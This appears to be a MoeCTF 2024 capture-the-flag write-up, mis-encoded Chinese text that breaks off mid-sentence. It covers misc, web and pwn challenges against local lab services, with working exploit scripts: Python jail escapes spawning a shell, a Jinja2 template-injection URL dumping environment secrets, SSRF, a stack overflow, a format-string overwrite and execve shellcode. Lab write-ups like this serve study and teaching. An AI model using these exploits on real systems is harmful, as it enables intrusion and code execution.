\"?\", \"39\": \"\", \"3a\": \"\", \"3b\": \"\", \"3c\": \"\", \"3d\": \"\", \"3e\": \"\", \"3f\": \"\", \"40\": \"\", \"41\": \"\", \"42\": \"\", \"43\": \"\", \"44\": \"\", \"45\": \"\", \"59\": \"1\", \"5a\": \"2\", \"5b\": \"3\", \"5c\": \"4\", \"5d\": \"5\", \"5e\": \"6\", \"5f\": \"7\", \"60\": \"8\", \"61\": \"9\", \"62\": \"0\"} flag = \"\" with open(\"usb.txt\",\"r+\") as f: lines = f.readlines() for line in lines: key = line[4:6] flag += normalKeys[key] print (flag) è¿è¡Œç»“æœï¼š\n6d6f656374667b6e3168613077307930756469616e6c33323435317d å†è½¬ä¸€ä¸‹hexå°±èƒ½æ‹¿åˆ°flagï¼š\nAbnormal lag é¢‘è°±å›¾ç›´æ¥çœ‹ï¼Œæ³¨æ„é¢˜ç›®ç»™å‡ºçš„æ­£åˆ™è¡¨è¾¾å¼ï¼š\nflagæ ¼å¼:moectf{[\\da-f-]+} moectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}\nso many â€™m' å­—é¢‘ç»Ÿè®¡ï¼Œç„¶åç…§ç€æ‹¼å°±æ˜¯flagï¼Œæ³¨æ„Må’Œpçš„ä½ç½®è¦æ¢ä¸€ä¸‹ï¼š\nmoectf{C0MpuTaskingD4rE}\nå°å°å¥—å¨ƒ png chunkå—æœ€åä¸€ä¸ªæ˜æ˜¾ä¸å¯¹åŠ²ï¼Œbinwalkå‡ºæ¥ä¸€ä¸ªzlibæ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹é‡Œæœ‰è§£å‹å¥½çš„æ–‡ä»¶ï¼Œæ‹¿å‡ºæ¥å‘ç°æ˜¯ä¸ªpngæ–‡ä»¶ï¼Œcyberchefè½¬ä¸€ä¸‹ï¼š\nå›¾ç‰‡æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œç›´æ¥æ‰«æ‹¿åˆ°ç¬¬ä¸€ä¸ªå‹ç¼©åŒ…å¯†ç ï¼š\né€ä½ ä¸€ä¸ªkeyï¼you've got the zipkey:874jfy37yf37y7 ç¬¬äºŒä¸ªtxtæ–‡ä»¶æ˜¯ä¸ªé›¶å®½å­—ç¬¦éšå†™ï¼Œlinuxä¸‹vimæ‰“å¼€ç¼–è¾‘æ–‡ä»¶å¯ä»¥çœ‹åˆ°æœ‰å“ªäº›é›¶å®½å­—ç¬¦ï¼š\nä¸è¿‡ä¸çŸ¥é“ä¸ºä»€ä¹ˆå‹¾ä¸Šäº†å¯¹åº”çš„é›¶å®½å­—ç¬¦åœ¨çº¿ç½‘ç«™è§£ä¸å‡ºï¼Œæ¢äº†ä¸ªç½‘ç«™ç›´æ¥å‡ºäº†ï¼š\næ‹¿åˆ°ç¬¬äºŒä¸ªå‹ç¼©åŒ…å¯†ç ï¼š\nidon'tknowmaybeits:dhufhduh48589 è§£å‹æ‹¿åˆ°flag.txtï¼Œé‡Œé¢æ˜¯æ–°ä½›æ›°åŠ å¯†çš„å†…å®¹ï¼Œç›´æ¥è§£å°±æ‹¿åˆ°flagï¼š\nmoejail_lv2.5 æç¤ºé‡Œç»™äº†æ­£åˆ™è¡¨è¾¾å¼ï¼š\nif re.search(r'[\"\\'0-8bdhosxy_]|[^\\x00-\\xff]', code): print(\"Nope\") if len(code) \u003e 15: print(\"Too long\") å®¹æ˜“æƒ³åˆ° eval(input()) æ¥ç»•è¿‡é™åˆ¶ï¼Œä¹‹åå°±æ˜¯æ‰¾flagï¼Œä¾æ—§åœ¨/tmpç›®å½•ä¸‹ï¼š\nGive me your code: eval(input()) __import__('os').system('cat /tmp/the*') moectf{50mEtlMeS-InpuT_CaN_be_A-M3tHOD_TO_BypAss_fIIt3rs0} moejail_lv3 if re.search(r\"[A-z0-9]\", code): print(\"Nope\") ç”¨unicodeå­—ç¬¦æ¥ç»•è¿‡å³å¯ï¼š\nfrom pwn import * unicode_chr = \"ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—ğ˜¢ğ˜£ğ˜¤ğ˜¥ğ˜¦ğ˜§ğ˜¨ğ˜©ğ˜ªğ˜«ğ˜¬ğ˜­ğ˜®ğ˜¯ğ˜°ğ˜±ğ˜²ğ˜³ğ˜´ğ˜µğ˜¶ğ˜·ğ˜¸ğ˜¹ğ˜ºğ˜»ğ˜ˆğ˜‰ğ˜Šğ˜‹ğ˜Œğ˜ğ˜ğ˜ğ˜ğ˜‘ğ˜’ğ˜”ğ˜•ğ˜–ğ˜—ğ˜˜ğ˜™ğ˜šğ˜›ğ˜œğ˜ğ˜ğ˜Ÿğ˜ ğ˜¡ï¼¿\" #ğ˜¦ğ˜·ğ˜¢ğ˜­(ğ˜ªğ˜¯ğ˜±ğ˜¶ğ˜µ()) exp = \"ğ˜¦ğ˜·ğ˜¢ğ˜­(ğ˜ªğ˜¯ğ˜±ğ˜¶ğ˜µ())\" p = remote(\"127.0.0.1\",30179) p.recvuntil(b\"Please enter '\") cha1 = p.recv(6).decode() p.recvuntil(b\"'+'\") cha2 = p.recv(6).decode() cha = cha1 + cha2 p.sendline(cha.encode()) p.sendlineafter(b\"Give me your code:\",exp.encode()) p.interactive() ä¹‹åæ­£å¸¸åœ¨/tmpç›®å½•ä¸‹æ‰¾flagï¼š\n__import__('os').system('cat /tmp/the*') moectf{peP-aIloW_yOU_use-uN1coD3_cHar_A5-A5Ci1_onEs0} moejail_lv4 Hint: eval(code, {\"__builtins__\": {\"eval\": lambda *x: print(\"sry, no eval for u\")},},{},) æ‰§è¡Œevalçš„ç¯å¢ƒæŠŠæ‰€æœ‰å†…ç½®å‡½æ•°éƒ½åˆ æ‰äº†ï¼Œåªç•™äº†ä¸ªæ”¹è¿‡çš„evalå‡½æ•°ï¼Œå…·ä½“å°±æ˜¯å¦‚æœcodeé‡Œæƒ³è¦æ‰§è¡Œ eval() ï¼Œæ— è®ºæ‹¬å·é‡Œæ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼š print(\"sry, no eval for u\")\nå¯ä»¥é€šè¿‡é­”æœ¯æ–¹æ³•é‡æ–°è·å– __builtins __ æ¨¡å—ï¼Œæ„é€ å¦‚ä¸‹å½¢å¼çš„ç»§æ‰¿é“¾ï¼š\n().__class__.__base__.__subclasses__()[{}].__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\").system(\"whoami\")'.format(i) ç”±äºevalä¸ä¼šè¿”å› ().__class__.__base__.__subclasses__() çš„ç»“æœï¼Œæ‰€ä»¥è€ƒè™‘çˆ†ç ´ï¼š\nfrom pwn import * def verify(): p.recvuntil(b\"Please enter '\") cha1 = p.recv(6).decode() p.recvuntil(b\"'+'\") cha2 = p.recv(6).decode() cha = cha1 + cha2 p.sendline(cha.encode()) def exp(i): exp = '().__class__.__base__.__subclasses__()[{}].__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\").system(\"ls /\")'.format(i) return exp p = remote(\"127.0.0.1\",1086) verify() for i in range(159): p.sendlineafter(b\"Give me your code:\",exp(i).encode()) res = p.recvline().decode() verify() print(i,res) è¿è¡Œç»“æœä¸­æœ‰ä¸€äº›æ˜¯æˆåŠŸæ‰§è¡Œ whoami çš„ï¼Œæ¯”å¦‚æœ€åå‡ ä¸ªï¼š\n154 nobody 155 nobody 156 nobody 157 ğŸ¤” Error: 'wrapper_descriptor' object has no attribute '__globals__' 158 nobody ä¹‹åå°±æ˜¯æ‹¿shellæ‰¾flagï¼Œç»™å‡ºå®Œæ•´expï¼š\nfrom pwn import * def verify(): p.recvuntil(b\"Please enter '\") cha1 = p.recv(6).decode() p.recvuntil(b\"'+'\") cha2 = p.recv(6).decode() cha = cha1 + cha2 p.sendline(cha.encode()) ''' def exp(i): exp = '().__class__.__base__.__subclasses__()[{}].__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\").system(\"ls /\")'.format(i) return exp p = remote(\"127.0.0.1\",1086) verify() for i in range(159): p.sendlineafter(b\"Give me your code:\",exp(i).encode()) res = p.recvline().decode() verify() print(i,res) ''' p = remote(\"127.0.0.1\",1086) verify() exp = '().__class__.__base__.__subclasses__()[158].__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\").system(\"sh\")' p.sendlineafter(b\"Give me your code:\",exp.encode()) p.interactive() ls /tmp therealflag_4e9e98cbe32a98ead5ed47dd59b3b238 cat /tmp/t* moectf{YoU-c4n_reCoveR_Glob4l5-@ND_6UI1tInS-FR0M-cuST0M_functions0} Webæ¸—é€æµ‹è¯•ä¸å®¡è®¡å…¥é—¨æŒ‡åŒ— æœ¬åœ°ç”¨phpstudyèµ·ä¸€ä¸ªç½‘ç«™å³å¯ï¼š\næˆ–è€…ç›´æ¥åˆ†æ index.php å’Œ script.php ï¼Œæ‰¾å‡ºåŠ å¯†æ–¹å¼ï¼Œèƒ½çœ‹åˆ°phpé‡Œç»™å‡ºäº†ciphertextå’Œkeyï¼š\n\u003c?php $data = array( \"ciphertext\" =\u003e \"F8NX+bX/AAT5oTosfY7JpiQ1oQM0onbI/41oFG9khFMr68qBn8ZlPia8XhrLSMFo\", \"key\" =\u003e \"1234567891011121\" ); header('Content-Type: application/json'); echo json_encode($data); ?\u003e å†å…³æ³¨htmlä¸­çš„bodyéƒ¨åˆ†ï¼Œèƒ½çœ‹åˆ°è¿›è¡Œäº†base64_deocde + AES-CBCçš„æ“ä½œï¼š\n\u003cbody\u003e \u003ch1 class=\"title\"\u003eWelcome to Moectf\u003c/h1\u003e \u003cdiv id=\"xt\"\u003e\u003c/div\u003e \u003cscript\u003e fetch('script.php') .then(response =\u003e response.json()) .then(data =\u003e { var ciphertext = data.ciphertext; var key = CryptoJS.enc.Utf8.parse(data.key); var iv = CryptoJS.enc.Utf8.parse(\"17829693\"); var decodedCiphertext = CryptoJS.enc.Base64.parse(ciphertext); var decrypted = CryptoJS.AES.decrypt({ ciphertext: decodedCiphertext }, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }); var plaintext = decrypted.toString(CryptoJS.enc.Utf8); document.getElementById('xt').innerHTML = '' + plaintext + '\n'; }) .catch(error =\u003e console.error('Error:', error)); \u003c/script\u003e \u003c/body\u003e cyberchefè§£ä¸€ä¸‹ä¹Ÿèƒ½æ‹¿åˆ°flagï¼Œæ³¨æ„ivä¸è¶³16å­—èŠ‚ï¼Œå¡«\\x00è¡¥é½å³å¯ï¼š\nå‹‡é—¯é“œäººé˜µ è¦æ±‚5æ¬¡æ­£ç¡®å›ç­”é—®é¢˜ï¼Œå¹¶ä¸”æ ¹æ®é—®é¢˜ï¼Œä¼šæœ‰ä¸¤ç§ç±»å‹çš„å›ç­”ï¼Œå¯ä»¥å…ˆæŠ“åŒ…çœ‹ä¸€ä¸‹ä¼ å‚ç±»å‹ï¼š\nå‘ç°æ˜¯POSTä¼ å‚ä»¥åŠå¯¹åº”é—®é¢˜ä½ç½®ï¼Œå†™ä¸ªè„šæœ¬æ³¨æ„ä¿æŒä¼šè¯å³å¯ï¼š\nimport requests import re position_mapping = {\"1\":\"åŒ—æ–¹\",\"2\":\"ä¸œåŒ—æ–¹\",\"3\":\"ä¸œæ–¹\",\"4\":\"ä¸œå—æ–¹\",\"5\":\"å—æ–¹\",\"6\":\"è¥¿å—æ–¹\",\"7\":\"è¥¿æ–¹\",\"8\":\"è¥¿åŒ—æ–¹\"} def start(): start = {\"player\": \"w8nn9z\", \"direct\": \"å¼Ÿå­æ˜ç™½\"} res = session.post(url,data=start) return res def num(res): pattern1 = re.compile(r'id=\"status\"\u003e\\s*.*\\s*\u003c/') message = re.findall(pattern1,res)[0] pattern2 = re.compile(r'\\d+') num = re.findall(pattern2,message) return num def sol(res): num_list = num(res.text) if len(num_list) == 1: req = position_mapping[str(num_list[0])] res = session.post(url,data={\"player\": \"w8nn9z\", \"direct\": req}) return res else: req = position_mapping[str(num_list[0])] + \"ä¸€ä¸ª\" + \"ï¼Œ\" + position_mapping[str(num_list[1])] + \"ä¸€ä¸ª\" res = session.post(url,data={\"player\": \"w8nn9z\", \"direct\": req}) return res url = \"http://127.0.0.1:1433/\" session = requests.session() res = start() for i in range(5): res = sol(res) print(res.text) è¾“å‡ºç»“æœï¼š\n\u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eå¬å£°è¾©ä½\u003c/title\u003e \u003c/head\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/style.css\"\u003e \u003cbody\u003e \u003ch1 id=\"title\"\u003eå¬å£°è¾©ä½\u003c/h1\u003e \u003cp\u003eé—¯å…³å¼Ÿå­æ³¨æ„ï¼Œæœ¬å…³ç»§ç»­è€ƒéªŒä½ å¬å£°è¾©ä½çš„åŠŸå¤«\u003c/p\u003e \u003cp\u003eä½ å¯å®šåä¸­å¤®ï¼Œå…ˆåå°†æœ‰äº”æ³¢æ•°å­—æŠ›å‡ºï¼Œä½ éœ€è¦åœ¨3ç§’å†…æŒ‰è¦æ±‚è¯´å‡ºæ–¹ä½\u003c/p\u003e \u003cp\u003eç¤ºä¾‹ï¼š1 -\u003e åŒ—æ–¹\u003c/p\u003e \u003cp\u003e2,3 -\u003e ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª\u003c/p\u003e \u003cp\u003eè¾“å…¥é€‰æ‰‹åå­—å’Œ \"å¼Ÿå­æ˜ç™½\" å¼€å§‹æ¸¸æˆ\u003c/p\u003e \u003cdiv class=\"parent\"\u003e \u003cimg src=\"/static/images/test.png\" id=\"imgs\"\u003e \u003c/div\u003e \u003cform action=\"/restart\" method=\"get\" id=\"div_restart\"\u003e \u003clabel for=\"restart\"\u003eæŒ‰ä¸‹æŒ‰é’®é‡æ–°å¼€å§‹ï¼š\u003c/label\u003e \u003cbutton id=\"restart\"\u003eå¼€å§‹\u003c/button\u003e \u003cbr\u003e\u003cbr\u003e \u003c/form\u003e \u003cform action=\"/\" method=\"post\" id=\"submit\"\u003e \u003clabel for=\"player\"\u003eè¯·è¾“å…¥é€‰æ‰‹åå­—ï¼š\u003c/label\u003e \u003cinput type=\"text\" id=\"player\" name=\"player\"\u003e \u003cbr\u003e\u003cbr\u003e \u003clabel for=\"direct\"\u003eè¯·å›ç­”é—®é¢˜ï¼š\u003c/label\u003e \u003cinput type=\"text\" id=\"direct\" name=\"direct\"\u003e \u003cbr\u003e\u003cbr\u003e \u003clabel for=\"say\"\u003eæŒ‰ä¸‹æŒ‰é’®å›ç­”ï¼š\u003c/label\u003e \u003cbutton id=\"say\"\u003eå›ç­”\u003c/button\u003e \u003c/form\u003e \u003ch1 id=\"status\"\u003e \u003cspan style=\"color:green;\"\u003eä½ è¿‡å…³ï¼ï¼ˆè¿‡å…³çš„å°æ›²ï¼‰\u003cbr\u003emoectf{w3LllI_YoU-PA55_The_cHal1eNGe-frrRrRom_tOnRen8}\u003c/span\u003e \u003c/h1\u003e \u003c/body\u003e \u003c/html\u003e whoâ€™s blog? ç½‘ç«™æœ‰è¿™æ ·ä¸€å¥è¯ï¼Œæç¤ºä¼ å‚idï¼š\nè¿™é‡Œæ›¾ç»æ˜¯ Sxrhhh çš„ä¸ªäººå°ç«™ã€‚ä½†æ˜¯è¿«äºå‹åŠ›ï¼ŒSxrhhh åªèƒ½æ‹å–è‡ªå·±çš„ç½‘ç«™äº†ã€‚æä¾›ä½ çš„ id æ¥é¢†å…»è¿™ä¸ªå¯æ€œçš„ç½‘ç«™å§ å°è¯•åå¯ä»¥å‘ç°æ˜¯sstiï¼Œå¹¶ä¸”å¦‚æœæŠ¥é”™å¯ä»¥å‘ç°æ˜¯Jinjia2çš„æ¨¡æ¿ï¼Œä¹‹åå°±æ˜¯å¸¸è§„æ³¨å…¥ï¼š\nhttp://127.0.0.1:32683/?id={{().__class__.__base__.__subclasses__()[239].__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('env').read()\"\")}} KUBERNETES_SERVICE_PORT=443 KUBERNETES_PORT=tcp://10.43.0.1:443 HOSTNAME=ret2shell-40-7062 PYTHON_PIP_VERSION=23.0.1 SHLVL=1 HOME=/root GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D WERKZEUG_SERVER_FD=4 PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/66d8a0f637083e2c3ddffc0cb1e65ce126afb856/public/get-pip.py WERKZEUG_RUN_MAIN=true KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_PROTO=tcp LANG=C.UTF-8 PYTHON_VERSION=3.10.14 PYTHON_SETUPTOOLS_VERSION=65.5.1 KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443 KUBERNETES_SERVICE_HOST=10.43.0.1 PWD=/app PYTHON_GET_PIP_SHA256=6fb7b781206356f45ad79efbb19322caa6c2a5ad39092d0d44d0fec94117e118 FLAG=moectf{d0-y0u-kNOw-SST1-4Nd_pl3A5e-V151t_5XRHHhS-BL0g2} ImageCloud é™„ä»¶ç»™äº†ä¸¤ä¸ªflaskæœåŠ¡çš„æºç ï¼Œapp.py éƒ¨ç½²åœ¨5000çš„ç«¯å£ä¸Šï¼Œè€Œ app2.py éƒ¨ç½²åœ¨5001~5999çš„ç«¯å£ä¸Šï¼ŒåŒæ—¶åœ¨ uploads ç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°æœ‰æŸåçš„ flag.jpg ï¼Œæç¤ºäº†flagå›¾ç‰‡çš„ä½ç½®\nå…ˆåˆ†æ app.py ï¼Œå®ç°äº†ä¸€ä¸ªå›¾ç‰‡ä¸Šä¼ çš„åŠŸèƒ½ï¼ŒUPLOAD_FOLDER = 'static/' ï¼Œä¸”é™åˆ¶äº†å¸¸è§çš„å›¾ç‰‡åç¼€ï¼ŒåŒæ—¶ /image è·¯ç”±ç”¨æ¥è·å–å›¾ç‰‡ï¼š\n@app.route('/image', methods=['GET']) def load_image(): url = request.args.get('url') if not url: return 'URL å‚æ•°ç¼ºå¤±', 400 try: response = requests.get(url) response.raise_for_status() img = Image.open(BytesIO(response.content)) img_io = BytesIO() img.save(img_io, img.format) img_io.seek(0) return send_file(img_io, mimetype=img.get_format_mimetype()) except Exception as e: return f\"æ— æ³•åŠ è½½å›¾ç‰‡: {str(e)}\", 400 å†åˆ†æ app2.py ï¼ŒåŒæ ·æœ‰å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ï¼Œä¸è¿‡ UPLOAD_FOLDER = 'uploads/'ï¼Œä¹Ÿå­˜åœ¨è·å–å›¾ç‰‡çš„è·¯ç”±ï¼š\n@app.route('/image/', methods=['GET']) def load_image(filename): filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename) if os.path.exists(filepath): mime = get_mimetype(filepath) return send_file(filepath, mimetype=mime) else: return 'æ–‡ä»¶æœªæ‰¾åˆ°', 404 è¿™æ ·è‡ªç„¶èƒ½æƒ³åˆ°é€šè¿‡å¤–éƒ¨å›¾ç‰‡äº‘çš„ /image è·¯ç”±å»è®¿é—®å†…éƒ¨å›¾ç‰‡äº‘çš„flagå›¾ç‰‡ï¼Œåªè¦å†çˆ†ç ´ä¸€ä¸‹ app2.py çš„ç«¯å£å³å¯ï¼š\næ‹¿åˆ°flagå›¾ç‰‡ï¼š\näºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ— ç›´æ¥ncæ˜¯ä¸è¡Œçš„ï¼Œéœ€è¦ç”¨pwntoolsè¿›è¡Œäº¤äº’\nfrom pwn import * p = remote(\"127.0.0.1\",52609) p.interactive() è¿è¡Œç»“æœ:\nHey, how did you get here? I've been waiting so long, for anyone... To honor your courage, I decided to give you a flag. But next time, it won't be so easy. moectf{Welcome_to_the_journey_of_Pwn} Good luck. By the way, netcat is not a cat! flag_helper ncè¿ä¸Šä»¥åå…ˆæ˜¯4ä¸ªé€‰æ‹©ï¼Œéƒ½å°è¯•äº†ä¸€éåå‘ç°åªæœ‰4æ‰èƒ½è¯»å–æ–‡ä»¶å†…å®¹è¿›è€Œè¯»å–/flag\nWelcome to MoeCTF 2024 \"Pwn\". Have trouble with flag? What can I do for you? 1. \"Capture the flag.\" 2. \"Goodbye.\" 3. \"V me 50 pts.\" 4. \"Play game with me.\" Make your choice. \u003e 4 OK. Tell me a file path. I can `read` what others cannot `read`. \u003e /flag åè¦æ±‚è¾“å…¥opençš„â€™flagsâ€™å‚æ•°ï¼Œè¾“å…¥0å‘ç°èƒ½æ‰“å¼€/flagæ–‡ä»¶\nNow, give me `flags` for this to-be-opened file. \u003e 0 Opened file /dev/random. Opened file /dev/urandom. Opened file /flag. Opened file /dev/zero. åè¦æ±‚è¾“å…¥mmapçš„â€™protâ€™å‚æ•°å’Œâ€™flagsâ€™å‚æ•°ï¼Œæœ¬æ¥ä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œåæ¥åœ¨åšä¸€é“ORWé¢˜ç›®æ—¶çœ‹åˆ°äº†å…³äºmmapçš„å†…å®¹ï¼ˆ\näºæ˜¯çŸ¥é“protå‚æ•°ä¸º7ï¼Œflagså‚æ•°ä¸º0x22å³34\nThen we have to `mmap` a place for the content... How do we `prot` it? \u003e 7 And, `flags`. (Calm down, your flag is on the way.) \u003e 34 Coming in three! Two... Oonnne... æœ€ååªè¦è¾“å…¥/flagå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å³å¯ï¼Œfdä»0å¼€å§‹åˆ†åˆ«å¯¹åº”äº†æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯ï¼Œä»¥åŠæ‰“å¼€çš„æ–‡ä»¶/dev/randomï¼Œ/dev/unrandomï¼Œ/flagï¼Œ/dev/zeroï¼Œæ‰€ä»¥/flagå¯¹åº”çš„fdä¸º5\n... I forgot the `fd` to read from. Do you still remember? \u003e 5 Oh, yes yeah, 5. Finally, here you are. moectf{f1IE-de5CR1PTOr-IS-PrEDlcT@bIe46361a} NotEnoughTime å£ç®—é¢˜å¡å±äºæ˜¯ï¼Œåªéœ€æ³¨æ„åœ°æ¿é™¤ä»¥åŠå»æ‰é¢˜ç›®çš„\\nå³å¯ï¼Œè¿›è¡Œå¤šæ¬¡äº¤äº’å¾—flag\nfrom pwn import * context(os='linux', arch='amd64', log_level='debug') p = remote(\"127.0.0.1\",53597) p.recvuntil(b\"Let's begin with simple ones.\\n\") p.sendlineafter(b\"=\",b\"2\") p.sendlineafter(b\"=\",b\"0\") p.recvuntil(b\"OK, then some tough ones. Be WELL PREPARED!\\n\") try: while (1): question = p.recvuntil(b\"=\").decode().replace(\"=\",\"\").replace(\"\\n\",\"\").replace(\"/\",\"//\") #print (question) answer = str(eval(question)).encode() p.sendline(answer) except EOFError: pass p.interactive() è¿è¡Œç»“æœ:\nä½ è¿‡å…³ã€‚ moectf{ArIthMEtlC-iS_noT_M@Them@tIc5f1720} no_more_gets åŸºç¡€çš„æ ˆæº¢å‡ºï¼Œæ³¨æ„æ ˆå¯¹é½å³å¯æ‹¿åˆ°shell\nfrom pwn import * context(os='linux', arch='amd64', log_level='debug') p = remote(\"127.0.0.1\",53741) offset = 0x50 + 8 backdoor_addr = 0x401176 ret = 0x40101a payload = cyclic(offset) + p64(ret) + p64(backdoor_addr) p.sendlineafter(b\"This is my own shell, enter the password or get out.\\n\",payload) p.interactive() #moectf{G3ts_StriNG-thUs-GEts_FLag37495d75} Moeplane æ²¡æœ‰å¯¹æ•°ç»„ engine_thrust çš„ index ä½œé™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥ç”¨è´Ÿæ•°è¦†ç›– flight ä¸Šçš„æ•°æ®ï¼š\nfrom pwn import * context(os='linux', arch='amd64', log_level='debug') p = remote(\"127.0.0.1\", 27818) p.sendlineafter(b\"\u003e \", b\"1\") p.sendlineafter(b\"\u003e \", b\"-15\") p.sendlineafter(b\"\u003e \", str(0x10).encode()) p.sendlineafter(b\"\u003e \", b\"1\") p.sendlineafter(b\"\u003e \", b\"-16\") p.sendlineafter(b\"\u003e \", str(0x20).encode()) p.sendlineafter(b\"\u003e \", b\"1\") p.sendlineafter(b\"\u003e \", b\"-17\") p.sendlineafter(b\"\u003e \", str(0x30).encode()) p.sendlineafter(b\"\u003e \", b\"1\") p.sendlineafter(b\"\u003e \", b\"-18\") p.sendlineafter(b\"\u003e \", str(0x40).encode()) p.sendlineafter(b\"\u003e \", b\"1\") p.sendlineafter(b\"\u003e \", b\"-19\") p.sendlineafter(b\"\u003e \", str(0x50).encode()) p.interactive() #moectf{compUt3r_fallur3_WOnt_leT_YOu_fly524785} leak_sth éšæœºæ•°æŒ‘æˆ˜ï¼Œç§å­æ˜¯å½“å‰æ—¶é—´ï¼Œæ¯æ¬¡éƒ½ä¸åŒï¼Œpythoné‡Œè°ƒç”¨Cåº“å‡½æ•°å³å¯ç”ŸæˆåŒæ ·çš„éšæœºæ•°å®ŒæˆæŒ‘æˆ˜æ‹¿åˆ°shell\nä¸è¿‡æ³¨æ„%ldè¡¨ç¤ºæœ‰ç¬¦å·é•¿æ•´å‹ï¼ŒèŒƒå›´ä¸º -2147483648 ~ 2147483647ï¼ˆ10ä½åè¿›åˆ¶æ•°ï¼‰\nfrom pwn import * from ctypes import * libc = cdll.LoadLibrary(\"./libc.so.6\") context(os='linux', arch='amd64', log_level='debug') #elf = ELF(\"./pwn\") #p = process(\"./pwn\") p = remote(\"127.0.0.1\",18156) seed = libc.time(0) libc.srand(seed) challenge_num = libc.rand() print (challenge_num) p.sendlineafter(b\"What's your name?\\n\",b\"w8nn9z\") p.sendlineafter(b\"Give me the number\\n\",str(challenge_num).encode()) p.interactive() #moectf{YOU_aRe_1ukY_Or_clEv3R29ef66bc} LoginSystem è¾“å‡ºç”¨æˆ·åå¤„å­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆfmtï¼‰ï¼Œgdbè°ƒè¯•å¯ä»¥çŸ¥é“åç§»ä¸º8ï¼Œä¸»è¦æ˜¯é€šè¿‡printfå’Œ%nè¾¾æˆè¦†ç›–passwordåœ°å€å†…å®¹çš„ç›®çš„ï¼Œè¿›è€Œæ‹¿shell\nä¸€å¼€å§‹è¿˜æƒ³ç€æ€ä¹ˆç¼©çŸ­payloadï¼Œåæ¥æƒ³äº†æƒ³è¾“å…¥b\"\\x00\"å‹çš„passwordå°±å¯ä»¥äº†ï¼Œä¸ç”¨æ˜¯å¯æ‰“å°å­—ç¬¦ï¼Œæœ¬åœ°å¤šè°ƒè¯•å‡ æ¬¡å°±èƒ½å‡º\nè¿™é¢˜æˆ‘è‡ªå·±åœ¨ç”¨fmtstr_payloadçš„æ—¶å€™ä¼šå‡ºé—®é¢˜ï¼Œç›´æ¥æ‰‹åŠ¨æ„é€ äº†ï¼ˆ\nfrom pwn import * #from ctypes import * #libc = cdll.LoadLibrary(\"./libc.so.6\") context(os='linux', arch='amd64', log_level='debug') elf = ELF(\"./pwn\") #p = process(\"./pwn\") p = remote(\"127.0.0.1\",19336) payload = b\"%2c%9$ln\" + p64(0x404050) p.sendlineafter(b\"username: \",payload) #gdb.attach(p) p.sendlineafter(b\"! Please input your password: \\n\",b\"\\x02\" + b\"\\x00\"*7) p.interactive() #moectf{Oh_You_cAn_6YP4SS_THE_P@5sWORD235e525} ez_shellcode æ²¡å¼€NXï¼Œå¾€æ ˆä¸Šå†™å…¥shellcodeå¯ä»¥è¢«æ‰§è¡Œï¼Œè€ƒè™‘åˆ°æœ‰å¯¹shellcodeçš„é•¿åº¦é™åˆ¶ï¼Œä¸€å¼€å§‹ç›´æ¥ç”¨äº†ä¸ª23é•¿åº¦çš„64ä½ç¨‹åºçš„shellcodeæ¢­äº†ï¼Œåæ¥è‡ªå·±åˆå†™äº†ä¸€ä¸ªç®€å•çš„ç³»ç»Ÿè°ƒç”¨çš„shellcodeï¼Œéƒ½èƒ½æ‰“é€š\nä¸è¿‡è¿™é¢˜æœ‰ä¸ªåœ°å€éšæœºåŒ–ï¼Œshellcodeå†™åœ¨æ³„éœ²çš„nbytes_4çš„åœ°å€ä¸Šå³å¯\nfrom pwn import * #from ctypes import * #libc = cdll.LoadLibrary(\"./libc.so.6\") context(os='linux', arch='amd64', log_level='debug') elf = ELF(\"./pwn\") #p = process(\"./pwn\") p = remote(\"127.0.0.1\",29972) p.sendlineafter(b\"Tell me your age:\\n\",b\"1000\") p.recvuntil(b\"Here is a gift for you :\\n\") nbytes_4_addr = int((p.recv(14)),base=16) #print (hex(nbytes_4_addr)) offset = 0x60 + 8 #shellcode = b\"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\" shellcode = asm(''' mov rax,59 mov rbx,0x0068732f6e69622f push rbx mov rdi,rsp mov rsi,0 mov rdx,0 syscall ''') #print (len(shellcode)) 37 payload = shellcode.ljust(offset) payload += p64(nbytes_4_addr) p.sendlineafter(b\"What do you want to say?\\n\",payload) p.interactive() #moectf{WE1l_D0ne-my-fRieND4ce76b7954} è¿™æ˜¯ä»€ä¹ˆï¼Ÿrandomï¼ å…ˆç®€å•çœ‹çœ‹ä»£ç é€»è¾‘ï¼Œæ˜¯ä¸€ä¸ª 0xA + 2 